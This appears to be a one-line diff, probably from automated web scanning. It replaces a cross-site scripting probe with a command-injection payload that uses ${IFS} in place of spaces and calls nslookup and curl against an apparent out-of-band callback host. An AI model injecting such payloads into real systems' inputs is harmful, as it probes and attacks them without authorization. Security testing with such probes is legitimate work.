@@ -1,1 +1,1 @@
-555'"()&%<zzz><ScRiPt >U5Uu(9976)</ScRiPt>
+|(nslookup${IFS}-q${IFS}cname${IFS}hitqbwyldjbln14270.bxss.me||curl${IFS}hitqbwyldjbln14270.bxss.me)
